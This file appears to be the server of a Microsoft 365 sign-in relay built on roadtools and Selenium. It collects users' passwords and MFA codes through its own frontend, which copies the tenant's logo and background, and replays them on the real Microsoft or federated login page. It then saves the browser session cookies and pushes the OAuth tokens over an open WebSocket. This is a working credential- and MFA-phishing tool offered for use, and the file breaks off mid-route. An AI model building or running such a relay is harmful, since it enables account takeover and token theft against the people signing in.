#!/usr/bin/env python3
"""
main.py

Endpoints:
  POST /login/username        -> { "username": "..." }  starts browser, enters username.
                                  Response includes "flow": "microsoft" | "federated" so
                                  the frontend knows which screen to show next.
  POST /login/password        -> { "username": "...", "password": "..." }  enters password
                                  on Microsoft's own page, starts a BACKGROUND job
  POST /login/org-signin      -> { "username": "...", "email": "...", "password": "..." }
                                  best-effort autofill for a federated third-party IdP page,
                                  then starts the same background finishing job
  GET  /login/status/<user>   -> current job state + any available MFA options + which
                                  federated domain (if any), scraped live from the DOM.
  POST /login/mfa-select      -> { "username": "...", "option": "<label seen in status>" }
                                  clicks a specific MFA method (e.g. "Text +X...")
  POST /login/mfa-code        -> { "username": "...", "code": "123456" }
                                  submits a verification code once the code-entry screen shows

Why a background job instead of one blocking call: the frontend needs to see
and react to the live MFA screen (push vs. picker vs. code entry) instead of
someone having to watch a separate Firefox window. So password entry runs in
a thread; the frontend polls /login/status to render whatever screen the
driver is actually on right now.

IMPORTANT CAVEAT: the specific element ids/xpaths used to detect and interact
with Microsoft's MFA screens ("i0116", "i0118", "idSIButton9", "KmsiDescription")
are verified against roadtx's own selenium.py. The MFA method-picker and OTP
code-entry selectors are best-effort based on commonly documented Microsoft
login markup and are NOT verified against live source the way the rest of
this file is.

FEDERATED/ORG ACCOUNT CAVEAT: /login/org-signin uses generic type-based
selectors (first email/text input, first password input, then a submit
button or Enter key) since there's no single verified markup across
third-party IdPs (GoDaddy-hosted M365, ADFS, Okta, PingFederate, etc.).
This works on many simple forms but isn't guaranteed for every provider —
if it fails on a specific IdP, inspect that page's real DOM and this can be
special-cased the same way the Microsoft flow was.

Every route below requires an authenticated admin session (see admin.py) —
none of this is reachable without first logging in at /admin/login.

Local-only tool: binds to 127.0.0.1, one login in flight at a time per username.
"""

import json
import os
import threading
import time
from dataclasses import dataclass, field
from enum import Enum
from functools import wraps
from pathlib import Path
from typing import Optional
from urllib.parse import urlparse, parse_qs

from flask import Flask, request, jsonify, render_template, redirect, url_for
from flask_socketio import SocketIO, join_room

from roadtools.roadtx.selenium import SeleniumAuthentication
from selenium import webdriver as _selenium_webdriver
from selenium.webdriver.firefox.options import Options as _FirefoxOptions
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.common.by import By
from selenium.webdriver.common.keys import Keys
from selenium.common.exceptions import (
    TimeoutException,
    ElementClickInterceptedException,
    ElementNotInteractableException,
    NoSuchElementException,
    NoSuchWindowException,
    StaleElementReferenceException,
)

from roadtools.roadlib.auth import Authentication, AuthenticationException, WELLKNOWN_CLIENTS, WELLKNOWN_RESOURCES
from roadtools.roadlib.deviceauth import DeviceAuthentication

from admin import admin_bp, init_admin_db
from dashboard import dashboard_bp
from roadrecon_actions import actions_bp

# ---------------------------------------------------------------------------
# Edit these directly
# ---------------------------------------------------------------------------

CLIENT_ID = WELLKNOWN_CLIENTS["azcli"]
RESOURCE = WELLKNOWN_RESOURCES["msgraph"]
REDIRURL = "https://login.microsoftonline.com/common/oauth2/nativeclient"
DRIVERPATH = os.environ.get("GECKODRIVER_PATH")
HEADLESS = False
STEP_TIMEOUT = 60
POLL_TIMEOUT_OVERALL = 300  # background job gives up after this long total

# Live browser session cookies captured from the interactive flow are written
# here, mirroring roadtx's own .roadtools_auth convention (same directory).
SESSION_COOKIES_FILE = Path(__file__).parent / ".roadtools_sessioncookies.json"


# ---------------------------------------------------------------------------
# Job / session state
# ---------------------------------------------------------------------------

class Stage(str, Enum):
    STARTING = "starting"                           # background thread is launching Firefox
    ENTERING_PASSWORD = "entering_password"
    AWAITING_ORG_LOGIN = "awaiting_org_login"      # redirected to a third-party/federated IdP
    AWAITING_MFA_CHOICE = "awaiting_mfa_choice"    # push screen, with a "use another way" link
    AWAITING_MFA_CODE = "awaiting_mfa_code"         # a code-entry input is on screen
    SUCCEEDED = "succeeded"
    FAILED = "failed"


@dataclass
class LoginSession:
    selauth: SeleniumAuthentication
    auth: Authentication
    created_at: float
    stage: Stage = Stage.ENTERING_PASSWORD
    mfa_options: list[str] = field(default_factory=list)
    federated_domain: Optional[str] = None
    error: Optional[str] = None
    tokens: Optional[dict] = None
    background_image: Optional[str] = None
    logo: Optional[str] = None
    footer_text: Optional[str] = None
    browser_ready: bool = False   # True once Firefox is on the password page
    lock: threading.Lock = field(default_factory=threading.Lock)


_sessions: dict[str, LoginSession] = {}
_sessions_lock = threading.Lock()

# ---------------------------------------------------------------------------
# Pre-warmed Firefox pool — one ready instance kept alive so /login/username
# can skip the ~5s Firefox cold-start entirely.
# ---------------------------------------------------------------------------

_warm_pool: list  = []          # holds (selauth, auth) tuples
_warm_lock = threading.Lock()
_POOL_SIZE = 1                   # keep one instance warm at all times


def _is_driver_alive(driver) -> bool:
    """Return True if the driver's current browsing context still exists."""
    try:
        _ = driver.window_handles  # raises if driver is dead
        return True
    except Exception:
        return False


def _make_firefox_driver(service):
    """Create a Firefox WebDriver with WebAuthn disabled (suppresses passkey prompts)."""
    opts = _FirefoxOptions()
    if HEADLESS:
        opts.add_argument("-headless")
    # Disable WebAuthn/FIDO2 so Microsoft never shows a passkey prompt in the
    # automated browser — without this, headless (and even visible) Firefox
    # triggers a native macOS Touch ID dialog that Selenium cannot dismiss.
    opts.set_preference("dom.webauthn.enabled", False)
    opts.set_preference("security.webauth.webauthn", False)
    return _selenium_webdriver.Firefox(service=service, options=opts)


def _spawn_warm_instance() -> None:
    """Launch Firefox in background, navigate to login page, park it in pool."""
    try:
        auth = Authentication(client_id=CLIENT_ID)
        deviceauth = DeviceAuthentication(auth)
        selauth = SeleniumAuthentication(auth, deviceauth, REDIRURL, headless=HEADLESS)
        service = selauth.get_service(DRIVERPATH)
        if not service:
            return
        selauth.driver = _make_firefox_driver(service)
        selauth.driver.response_interceptor = selauth.redir_interceptor
        # Navigate to login page so it's already loaded when needed
        authority = auth.get_authority_url()
        login_url = (
            f"{authority}/oauth2/authorize"
            f"?client_id={CLIENT_ID}&resource={RESOURCE}"
            f"&redirect_uri={REDIRURL}&response_type=code&prompt=login"
        )
        selauth.driver.get(login_url)
        with _warm_lock:
            _warm_pool.append((selauth, auth))
    except Exception:
        pass  # silently skip — cold-start fallback still works


def _take_warm_instance():
    """Pop a pre-warmed (selauth, auth) pair, then refill the pool in background.

    Validates that the popped instance is still alive before returning it;
    discards stale/dead instances and tries the next one.
    """
    taken = None
    with _warm_lock:
        while _warm_pool:
            candidate = _warm_pool.pop(0)
            selauth, _auth = candidate
            if _is_driver_alive(selauth.driver):
                taken = candidate
                break
            # Dead instance — quit it silently in background
            threading.Thread(
                target=_quit_driver_safely, args=(selauth.driver,), daemon=True
            ).start()

    return taken


def _new_selauth() -> SeleniumAuthentication:
    auth = Authentication(client_id=CLIENT_ID)
    deviceauth = DeviceAuthentication(auth)
    selauth = SeleniumAuthentication(auth, deviceauth, REDIRURL, headless=HEADLESS)

    service = selauth.get_service(DRIVERPATH)
    if not service:
        raise RuntimeError("geckodriver not found — check DRIVERPATH")

    selauth.driver = _make_firefox_driver(service)
    selauth.driver.response_interceptor = selauth.redir_interceptor
    return selauth


def _build_login_url(auth: Authentication) -> str:
    authority = auth.get_authority_url()
    return (
        f"{authority}/oauth2/authorize"
        f"?client_id={CLIENT_ID}"
        f"&resource={RESOURCE}"
        f"&redirect_uri={REDIRURL}"
        f"&response_type=code"
        f"&prompt=login"
    )


def _extract_code_from_url(driver) -> Optional[str]:
    if "?code=" not in driver.current_url:
        return None
    parsed = urlparse(driver.current_url)
    return parse_qs(parsed.query)["code"][0]


def _click_robust(driver, element):
    try:
        element.click()
    except ElementClickInterceptedException:
        driver.execute_script("arguments[0].click();", element)


def _quit_driver_safely(driver) -> None:
    try:
        driver.quit()
    except Exception:
        pass


def _capture_branding(driver) -> dict:
    """
    Capture Microsoft login page branding.

    Background: takes a Selenium screenshot and returns it as a base64 data
    URL — this works for ALL account types (consumer live.com, work/school
    aad, federated) regardless of how Microsoft sets the background (CSS,
    inline img, shadow DOM, etc.).  The heavy CSS blur in the frontend hides
    the Microsoft password-card that appears in the screenshot, leaving only
    the colour/texture of the background visible.

    Logo + footer: scraped from the DOM as before.
    """
    try:
        out: dict = {"background_image": None, "logo": None, "footer_text": None}

        # --- Background: try to grab the actual background image URL first ---
        # New Fluent UI (login.live.com) renders a full-page <img role="presentation">
        # as the very first element on the page; that's the background image.
        # Fall back to Selenium screenshot (works for any page structure).
        try:
            bg_url = driver.execute_script("""
                // 1. Fluent UI: large <img role="presentation"> (covers full viewport)
                const vp = window.innerWidth * window.innerHeight;
                for (const img of document.querySelectorAll('img[role="presentation"]')) {
                    if (!img.src) continue;
                    const r = img.getBoundingClientRect();
                    if (r.width * r.height > vp * 0.2) return img.src;
                }
                // 2. Any large <img> covering >20% of viewport
                let bestSrc = null, bestArea = 0;
                for (const img of document.querySelectorAll('img')) {
                    if (!img.src || img.src.startsWith('data:')) continue;
                    const r = img.getBoundingClientRect();
                    const area = r.width * r.height;
                    if (area > vp * 0.2 && area > bestArea) {
                        bestArea = area; bestSrc = img.src;
                    }
                }
                if (bestSrc) return bestSrc;
                // 3. CSS background-image on known MS containers
                for (const id of ['boBackground','background','backgroundImage','loginBackground']) {
                    const el = document.getElementById(id);
                    if (!el) continue;
                    const bg = (el.style.backgroundImage ||
                                window.getComputedStyle(el).backgroundImage);
                    const m = bg && bg.match(/url\\(['"]?([^'"\\)]+)['"]?\\)/);
                    if (m && m[1] && m[1].startsWith('http')) return m[1];
                }
                return null;
            """)
            if bg_url:
                out["background_image"] = bg_url
        except Exception:
            pass

        # Screenshot fallback: guaranteed to capture whatever the browser shows.
        if not out["background_image"]:
            try:
                b64 = driver.get_screenshot_as_base64()
                if b64:
                    out["background_image"] = f"data:image/png;base64,{b64}"
            except Exception:
                pass

        # --- Logo: known Microsoft element IDs first, then banner-class img ---
        logo_js = driver.execute_script("""
            const bannerLogo = document.getElementById('bannerLogo');
            if (bannerLogo && bannerLogo.src) return bannerLogo.src;
            for (const img of document.querySelectorAll('img')) {
                const id = img.id || '', cls = img.className || '';
                if ((id.includes('banner') || cls.includes('banner')) && img.src)
                    return img.src;
            }
            return null;
        """)
        if logo_js:
            out["logo"] = logo_js

        # --- Footer: tenant-configured boilerplate text ---
        footer_js = driver.execute_script("""
            for (const id of ['footerTextContent','idBoilerPlateText','idDiv_SAOTCC_Title']) {
                const el = document.getElementById(id);
                const txt = el && el.innerText && el.innerText.trim();
                if (txt && txt.length <= 200 && !el.querySelector('input,button,form'))
                    return txt;
            }
            return null;
        """)
        if footer_js:
            out["footer_text"] = footer_js

        return out
    except Exception:
        return {}


def _username_error_text(driver) -> Optional[str]:
    """
    Microsoft shows inline validation errors (e.g. "Enter a valid email
    address, phone number, or Skype name.") in #usernameError without
    navigating away or removing #i0118 from the DOM, so callers must check
    this explicitly rather than assuming #i0118 means the password step.
    """
    try:
        el = driver.find_element(By.ID, "usernameError")
    except NoSuchElementException:
        return None
    text = el.text.strip()
    return text if text and el.is_displayed() else None


# Microsoft-owned sign-in domains — personal accounts redirect to login.live.com,
# government clouds use microsoftonline.us, etc.  None of these are third-party.
_MICROSOFT_OWNED_DOMAINS = {
    "login.microsoftonline.com",
    "login.microsoft.com",
    "login.live.com",
    "account.live.com",
    "login.microsoftonline.us",          # US Government
    "login.partner.microsoftonline.cn",  # China
}


def _is_federated_redirect(driver) -> Optional[str]:
    """
    Returns the redirected-to domain if the browser has navigated away from
    ALL Microsoft-owned sign-in domains (i.e. the tenant is truly federated to
    a third-party IdP like ADFS, Okta, or GoDaddy-hosted M365).
    Returns None when we're still on any Microsoft-owned page.
    """
    try:
        netloc = urlparse(driver.current_url).netloc.lower()
    except Exception:
        return None
    if not netloc:
        return None
    # Strip port if present
    domain = netloc.split(":")[0]
    if any(domain == ms or domain.endswith("." + ms) for ms in _MICROSOFT_OWNED_DOMAINS):
        return None
    return domain


# ---------------------------------------------------------------------------
# DOM scraping — classify current screen + list clickable MFA options
# ---------------------------------------------------------------------------

# Known, text-based markers for each MFA option row. Best-effort — verify
# against real DOM if a match fails.
_MFA_OPTION_PATTERNS = [
    "Approve a request on my Microsoft Authenticator app",
    "Use a verification code",
    "Text +",
    "Call +",
]

_SWITCH_METHOD_LINK_TEXT = "can't use my Microsoft Authenticator app"

# Substrings that appear in Microsoft's password-error messages across
# login.microsoftonline.com and login.live.com.
_MS_PASSWORD_ERROR_FRAGMENTS = [
    "password is incorrect",
    "account or password is incorrect",
    "That Microsoft account doesn't exist",
    "account doesn't exist",
]


def _get_password_error(driver) -> Optional[str]:
    """Return the visible password-error text shown by Microsoft, or None."""
    # 1. Known element IDs (login.microsoftonline.com)
    for el_id in ("passwordError", "idTD_PwdGreeting"):
        try:
            el = driver.find_element(By.ID, el_id)
            if el.is_displayed():
                txt = el.text.strip()
                if txt:
                    return txt
        except (NoSuchElementException, StaleElementReferenceException):
            pass

    # 2. aria-live alert elements (login.live.com surfaces errors this way)
    for css in ('div[aria-live="assertive"]', '[role="alert"]'):
        try:
            els = driver.find_elements(By.CSS_SELECTOR, css)
            for el in els:
                if el.is_displayed():
                    txt = el.text.strip()
                    if txt and any(f in txt.lower() for f in _MS_PASSWORD_ERROR_FRAGMENTS):
                        return txt
        except (NoSuchElementException, StaleElementReferenceException):
            pass

    # 3. Broad text-fragment fallback — but restrict to leaf-ish nodes so we
    #    don't return the entire page text when the fragment matches an ancestor.
    for fragment in _MS_PASSWORD_ERROR_FRAGMENTS:
        try:
            # prefer the deepest (last()) element matching the text
            el = driver.find_element(
                By.XPATH,
                f"(//*[contains(normalize-space(.), {_xpath_literal(fragment)})"
                f" and not(.//*[contains(normalize-space(.), {_xpath_literal(fragment)})])])[last()]"
            )
            if el.is_displayed():
                txt = el.text.strip()
                if txt:
                    return txt
        except (NoSuchElementException, StaleElementReferenceException):
            pass

    return None


def _xpath_literal(s: str) -> str:
    """Safely quote a string for XPath even if it contains a single quote."""
    if "'" not in s:
        return f"'{s}'"
    parts = s.split("'")
    return "concat(" + ", \"'\", ".join(f"'{p}'" for p in parts) + ")"


def _find_by_text(driver, text_fragment):
    try:
        return driver.find_element(
            By.XPATH,
            f"(//*[contains(normalize-space(.), {_xpath_literal(text_fragment)})])[last()]",
        )
    except NoSuchElementException:
        return None


def _scrape_mfa_options(driver) -> list[str]:
    switch_link = _find_by_text(driver, _SWITCH_METHOD_LINK_TEXT)
    if switch_link is not None and _find_by_text(driver, "Approve sign in request") is not None:
        return [switch_link.text.strip() or "I can't use my Microsoft Authenticator app right now"]

    found = []
    for pattern in _MFA_OPTION_PATTERNS:
        el = _find_by_text(driver, pattern)
        if el is not None:
            found.append(el.text.strip() or pattern)
    return found


def _classify_screen(driver) -> Stage:
    if "?code=" in driver.current_url:
        return Stage.SUCCEEDED
    for candidate_id in ("idTxtBx_SAOTCC_OTC",):
        try:
            driver.find_element(By.ID, candidate_id)
            return Stage.AWAITING_MFA_CODE
        except NoSuchElementException:
            pass
    if _find_by_text(driver, "Verify your identity") is not None or \
       _find_by_text(driver, "Approve sign in request") is not None or \
       _find_by_text(driver, _SWITCH_METHOD_LINK_TEXT) is not None:
        return Stage.AWAITING_MFA_CHOICE
    return Stage.ENTERING_PASSWORD


# ---------------------------------------------------------------------------
# Background worker
# ---------------------------------------------------------------------------

def _persist_session_cookies(cookies) -> None:
    """
    Write the live browser session cookies (from driver.get_cookies()) to
    SESSION_COOKIES_FILE. Best-effort: capturing these must never break the
    auth flow, so any write error is swallowed. Must be called while the
    driver is still open (i.e. before session_safe's finally closes it).
    """
    try:
        SESSION_COOKIES_FILE.write_text(json.dumps(cookies, indent=2))
    except (OSError, TypeError):
        pass


def session_safe(stage_on_error: Optional[Stage] = None):
    """
    Same idea as roadtx's own @selenium_wrap: wrap a background job step so
    every failure is caught, recorded on the session, and logged in one
    place — instead of each job function writing its own try/except that
    duplicates the same "mark failed + store error" logic.
    Usage:
        @session_safe(stage_on_error=Stage.FAILED)
        def _run_password_job(username, password):
            ...
    """
    def decorator(fn):
        @wraps(fn)
        def wrapper(username, *args, **kwargs):
            with _sessions_lock:
                session = _sessions.get(username)
            if not session:
                return
            try:
                return fn(username, *args, **kwargs)
            except Exception as exc:
                with session.lock:
                    session.error = str(exc)
                    if stage_on_error:
                        session.stage = stage_on_error
                _emit_status(username, session)
                # Only quit the driver on an unexpected error — a clean return
                # (e.g. wrong-password detected) leaves the driver open for retry.
                try:
                    session.selauth.driver.quit()
                except Exception:
                    pass
        return wrapper
    return decorator


def _finish_credentials_flow(username: str, session: LoginSession, driver) -> None:
    """
    Shared tail end of both auth flows: handle KMSI, poll for MFA/redirect,
    capture cookies, exchange the code, save tokens. Runs after credentials
    have already been entered — either by _run_password_job's Microsoft-
    specific i0118 typing, or by login_org_signin's generic federated fill.
    Not decorated itself; callers wrap this in @session_safe so exceptions
    raised here are still caught and the driver still gets closed.
    """
    started = time.time()

    # Handle "Stay signed in?" / KMSI interstitial.
    # Classic MSOID UI: KmsiDescription + idSIButton9
    # New Fluent UI (login.live.com): data-testid="acceptButton" or button text "Yes"
    def _is_kmsi_screen(d):
        if "?code=" in d.current_url:
            return True
        for el_id in ("KmsiDescription",):
            try:
                if d.find_element(By.ID, el_id).is_displayed():
                    return True
            except (NoSuchElementException, StaleElementReferenceException):
                pass
        for sel in ('[data-testid="acceptButton"]', '[data-testid="kmsiForm"]'):
            try:
                if d.find_element(By.CSS_SELECTOR, sel).is_displayed():
                    return True
            except (NoSuchElementException, StaleElementReferenceException):
                pass
        return False

    try:
        WebDriverWait(driver, 5).until(_is_kmsi_screen)
        if "?code=" not in driver.current_url:
            # Try classic idSIButton9 first, then Fluent UI acceptButton
            for by, sel in [(By.ID, "idSIButton9"),
                            (By.CSS_SELECTOR, '[data-testid="acceptButton"]')]:
                try:
                    btn = driver.find_element(by, sel)
                    if btn.is_displayed():
                        _click_robust(driver, btn)
                        break
                except (NoSuchElementException, ElementNotInteractableException,
                        StaleElementReferenceException):
                    pass
    except TimeoutException:
        pass

    _prev_stage = None
    _prev_error = None
    while time.time() - started < POLL_TIMEOUT_OVERALL:
        if "?code=" in driver.current_url:
            break
        stage = _classify_screen(driver)
        # Detect Microsoft's inline "password is incorrect" error so the
        # ROADtools UI can surface it and let the user retry.
        pw_error = _get_password_error(driver) if stage == Stage.ENTERING_PASSWORD else None
        with session.lock:
            session.stage = stage
            session.error = pw_error          # None clears stale error on re-try
            session.mfa_options = _scrape_mfa_options(driver) if stage == Stage.AWAITING_MFA_CHOICE else []
        # Push to WebSocket clients only when something changed — avoids
        # spamming the socket on every 0.5s tick while waiting for MFA.
        if stage != _prev_stage or pw_error != _prev_error:
            _emit_status(username, session)
            _prev_stage, _prev_error = stage, pw_error
        if pw_error:
            # Wrong password — stop polling so the frontend can re-enable the
            # password field for a retry without killing the browser.
            return
        time.sleep(0.5)

    code = _extract_code_from_url(driver)
    if not code:
        raise AuthenticationException("No authorization code found in redirect URL")

    # Grab the live session cookies while the driver is still open — this has to
    # happen here (not in the decorator) because session_safe's finally closes
    # the driver. Best-effort: never let cookie capture derail the token exchange.
    try:
        _persist_session_cookies(driver.get_cookies())
    except Exception:
        pass

    if session.auth.scope:
        tokens = session.auth.authenticate_with_code_native_v2(code, REDIRURL)
    else:
        tokens = session.auth.authenticate_with_code_native(code, REDIRURL)

    with session.lock:
        session.tokens = tokens
        session.stage = Stage.SUCCEEDED

    _emit_status(username, session)

    # Browser is no longer needed — clean it up in the background.
    threading.Thread(target=_quit_driver_safely, args=(driver,), daemon=True).start()


def _find_password_input(driver):
    """Return the first visible password input, trying known Microsoft IDs first
    then falling back to a generic CSS selector (covers login.live.com variants)."""
    # Preferred: known Microsoft identity platform IDs
    # i0118 = classic MSOID/AAD UI; passwordEntry = new Fluent UI (login.live.com)
    for el_id in ("i0118", "passwordEntry"):
        try:
            el = driver.find_element(By.ID, el_id)
            if el.is_displayed():
                return el
        except (NoSuchElementException, StaleElementReferenceException):
            pass
    # Fallback: any visible password input
    try:
        el = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
        if el.is_displayed():
            return el
    except (NoSuchElementException, StaleElementReferenceException):
        pass
    return None


def _find_submit_button(driver):
    """Return the first visible submit button, trying known IDs first."""
    for by, selector in [
        (By.ID, "idSIButton9"),
        (By.CSS_SELECTOR, "button[type='submit']"),
        (By.CSS_SELECTOR, "input[type='submit']"),
    ]:
        try:
            el = driver.find_element(by, selector)
            if el.is_displayed():
                return el
        except (NoSuchElementException, StaleElementReferenceException):
            pass
    return None


@session_safe(stage_on_error=Stage.FAILED)
def _run_password_job(username: str, password: str):
    with _sessions_lock:
        session = _sessions.get(username)

    # The user might submit their password before Firefox has finished typing
    # the email and reaching the password page.  Wait here until the username
    # background job signals it's done (browser_ready), or until we time out.
    wait_deadline = time.time() + STEP_TIMEOUT
    while time.time() < wait_deadline:
        with session.lock:
            if session.browser_ready:
                break
            if session.stage == Stage.FAILED:
                return  # username step already failed; nothing to do
        time.sleep(0.25)

    driver = session.selauth.driver

    # Clear any previous wrong-password error so the frontend shows "Signing in..."
    # cleanly while we type the new attempt.
    with session.lock:
        session.error = None

    # Wait for password field (i0118 on MSOID, or any password input on live.com).
    # live.com can re-render the field after it first appears, so retry on stale.
    deadline = time.time() + STEP_TIMEOUT
    while True:
        pw_el = WebDriverWait(driver, max(1.0, deadline - time.time())).until(
            lambda d: _find_password_input(d)
        )
        try:
            pw_el.clear()
            pw_el.send_keys(password)
            break
        except StaleElementReferenceException:
            if time.time() >= deadline:
                raise
            time.sleep(0.3)

    # Click submit (idSIButton9 on MSOID, or first submit button)
    submit = WebDriverWait(driver, STEP_TIMEOUT).until(
        lambda d: _find_submit_button(d)
    )
    _click_robust(driver, submit)

    _finish_credentials_flow(username, session, driver)


@session_safe(stage_on_error=Stage.FAILED)
def _run_org_login_job(username: str):
    """
    Federated-flow counterpart to _run_password_job. Credentials were
    already typed into the third-party IdP's page by login_org_signin()
    before this job starts — this just runs the shared MFA/code/token tail.
    """
    with _sessions_lock:
        session = _sessions.get(username)

    driver = session.selauth.driver
    _finish_credentials_flow(username, session, driver)


# ---------------------------------------------------------------------------
# App
# ---------------------------------------------------------------------------

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="threading")

app.secret_key = "paste-your-random-string-here"
app.register_blueprint(admin_bp)
app.register_blueprint(dashboard_bp)
app.register_blueprint(actions_bp)
init_admin_db()

# Pre-warm one Firefox instance in the background so the first login is fast.
threading.Thread(target=_spawn_warm_instance, daemon=True).start()


@app.route("/")
def index():
    return redirect(url_for("dashboard.dashboard_page"))


@app.route("/minisoft")
def minisoft_page():
    # Temporary test scaffold: serves the legacy standalone interactive-login
    # page (superseded by the dashboard's "Interactive (live)" tab). It drives
    # the same /login/* endpoints, so it must be served here
    # (same origin, session cookie) rather than opened as a file:// page.
    return render_template("minisoft.html")


def _recover_window(driver) -> bool:
    """If the current browsing context was discarded, try switching to the first
    surviving window handle. Returns True if recovery succeeded."""
    try:
        handles = driver.window_handles
        if handles:
            driver.switch_to.window(handles[0])
            return True
    except Exception:
        pass
    return False


def _poll_for_password_screen(driver, deadline: float) -> None:
    """
    Loop until the Microsoft password field (i0118), federated redirect, auth
    code in URL, or a username error appears — whichever comes first.

    Handles two interstitials automatically:
    • Passkey error page  → clicks "Sign in another way"
    • Browsing context discarded (Touch ID cancelled / passkey popup closed)
      → switches to the first surviving window handle and continues

    Raises TimeoutException if the deadline passes without a terminal state.
    Raises RuntimeError (with a short user-facing message) for username errors.
    """
    while True:
        if time.time() > deadline:
            raise TimeoutException("Timed out waiting for the username/password screen.")

        try:
            # ── Passkey / WebAuthn error interstitial ──────────────────────
            # Microsoft shows "Sign in another way" when the passkey flow fails.
            try:
                link = driver.find_element(By.PARTIAL_LINK_TEXT, "Sign in another way")
                if link.is_displayed():
                    link.click()
                    time.sleep(1.0)
                    continue
            except (NoSuchElementException, StaleElementReferenceException):
                pass

            # ── Password field ─────────────────────────────────────────────
            # login.microsoftonline.com uses #i0118; login.live.com (personal
            # accounts) uses the same ID but sometimes also exposes a
            # type="password" input when the account is recognised.
            try:
                pw = driver.find_element(By.ID, "i0118")
                if pw.is_displayed():
                    return  # ← success
            except (NoSuchElementException, StaleElementReferenceException):
                pass
            # Fallback: any visible password input (covers live.com variants)
            try:
                pw = driver.find_element(By.CSS_SELECTOR, "input[type='password']")
                if pw.is_displayed():
                    return  # ← success
            except (NoSuchElementException, StaleElementReferenceException):
                pass

            # ── Auth code already in URL (device-flow shortcut) ────────────
            if "?code=" in driver.current_url:
                return

            # ── Federated / third-party IdP redirect ───────────────────────
            if _is_federated_redirect(driver):
                return

            # ── Inline username validation error ───────────────────────────
            err = _username_error_text(driver)
            if err:
                raise RuntimeError(err)

        except (NoSuchWindowException, NoSuchElementException) as exc:
            # "Browsing context has been discarded" — happens when the passkey
            # OS-level dialog (e.g. macOS Touch ID) is dismissed and Firefox
            # closes the WebAuthn popup.  Try to recover by switching to any
            # surviving window; if none exist, propagate the error.
            if "Browsing context" in str(exc) or isinstance(exc, NoSuchWindowException):
                if not _recover_window(driver):
                    raise TimeoutException(
                        "The browser window was closed unexpectedly (passkey dialog cancelled?). "
                        "Please try again."
                    ) from exc
                time.sleep(0.5)
                continue
            raise

        time.sleep(0.4)


def _run_username_job(username: str, session: "LoginSession") -> None:
    """Background worker for /login/username — runs Firefox, types the email,
    waits for the password / federated-redirect screen, then updates *session*
    in place so the frontend's /login/status poll can pick up the result."""
    try:
        warm = _take_warm_instance()
        if warm is not None:
            selauth, auth = warm
            driver = selauth.driver
        else:
            selauth = _new_selauth()
            auth = selauth.auth
            driver = selauth.driver
            driver.get(_build_login_url(auth))

        # Patch the session with the real driver objects now that we have them.
        with session.lock:
            session.selauth = selauth
            session.auth = auth

        el = WebDriverWait(driver, STEP_TIMEOUT).until(lambda d: d.find_element(By.ID, "i0116"))
        el.send_keys(username + Keys.ENTER)

        _poll_for_password_screen(driver, time.time() + STEP_TIMEOUT)

        # Settle any pending client-side redirect before reading final state.
        # Check for password field using CSS selector so it works on both
        # classic MSOID (i0118) and new Fluent UI (passwordEntry).
        time.sleep(0.5)
        if "?code=" not in driver.current_url:
            try:
                WebDriverWait(driver, 3).until(
                    lambda d: _find_password_input(d) or _is_federated_redirect(d)
                )
            except TimeoutException:
                pass

        federated_domain = _is_federated_redirect(driver)
        branding = {} if federated_domain else _capture_branding(driver)

        with session.lock:
            session.stage = Stage.AWAITING_ORG_LOGIN if federated_domain else Stage.ENTERING_PASSWORD
            session.federated_domain = federated_domain
            session.background_image = branding.get("background_image")
            session.logo = branding.get("logo")
            session.footer_text = branding.get("footer_text")
            session.browser_ready = True   # Firefox is now on the password page

        _emit_status(username, session)

        # Now that the password screen is ready, pre-warm the next Firefox
        # instance in background — this way only ONE Firefox is visible during
        # the email-validation step, and the second one appears after the user
        # is already on the password screen.
        threading.Thread(target=_spawn_warm_instance, daemon=True).start()

    except TimeoutException as exc:
        with session.lock:
            session.stage = Stage.FAILED
            session.error = str(exc)
        _emit_status(username, session)
    except RuntimeError as exc:
        # Short user-facing message (e.g. username validation error)
        threading.Thread(target=_quit_driver_safely,
                         args=(session.selauth.driver if session.selauth else None,),
                         daemon=True).start()
        with session.lock:
            session.stage = Stage.FAILED
            session.error = str(exc)
        _emit_status(username, session)
    except Exception as exc:
        with session.lock:
            session.stage = Stage.FAILED
            # Strip noisy Selenium stacktraces from the user-facing message
            msg = str(exc).split("\n")[0].replace("Message: ", "").strip()
            session.error = msg or "An unexpected error occurred."
        _emit_status(username, session)


# ---------------------------------------------------------------------------
# WebSocket helpers
# ---------------------------------------------------------------------------

def _emit_status(username: str, session: "LoginSession") -> None:
    """Push the current session state to all WebSocket clients in the username room.
    Called from background threads whenever stage/error changes — replaces polling."""
    with session.lock:
        payload = {
            "ok": session.stage != Stage.FAILED,
            "stage": session.stage,
            "mfa_options": session.mfa_options,
            "federated_domain": session.federated_domain,
            "error": session.error,
            "tokens": session.tokens,
            "background_image": session.background_image,
            "logo": session.logo,
            "footer_text": session.footer_text,
        }
    socketio.emit("status", payload, room=username)


@socketio.on("join")
def on_join(data):
    """Client calls this after submitting a username to subscribe to push updates."""
    username = (data or {}).get("username", "").strip()
    if username:
        join_room(username)


# ---------------------------------------------------------------------------

@app.route("/login/username", methods=["POST"])
def login_username():
    data = request.get_json(force=True) or {}
    username = data.get("username", "").strip()
    if not username:
        return jsonify({"ok": False, "output": "username is required."}), 400

    with _sessions_lock:
        existing = _sessions.get(username)
        if existing is not None:
            if time.time() - existing.created_at < POLL_TIMEOUT_OVERALL:
                return jsonify({"ok": False, "output": "A login is already in progress for this username."}), 409
            _sessions.pop(username, None)
            if existing.selauth and existing.selauth.driver:
                threading.Thread(target=_quit_driver_safely, args=(existing.selauth.driver,), daemon=True).start()

        # Create a placeholder session immediately so /login/status can report
        # "starting" while the background thread fires up Firefox.
        # selauth/auth are set to None temporarily; the worker fills them in.
        placeholder = LoginSession(
            selauth=None,  # type: ignore[arg-type]
            auth=None,     # type: ignore[arg-type]
            created_at=time.time(),
            stage=Stage.STARTING,
        )
        _sessions[username] = placeholder

    # Launch the browser work in a daemon thread — return to the caller NOW.
    threading.Thread(target=_run_username_job, args=(username, placeholder), daemon=True).start()

    return jsonify({"ok": True, "username": username, "status": "starting"})


@app.route("/login/password", methods=["POST"])
def login_password():
    data = request.get_json(force=True) or {}
    username = data.get("username", "").strip()
    password = data.get("password", "")

    if not username or not password:
        return jsonify({"ok": False, "output": "username and password are both required."}), 400

    with _sessions_lock:
        session = _sessions.get(username)
    if not session:
        return jsonify({"ok": False, "output": "No in-progress login for this username. Call /login/username first."}), 404

    threading.Thread(target=_run_password_job, args=(username, password), daemon=True).start()
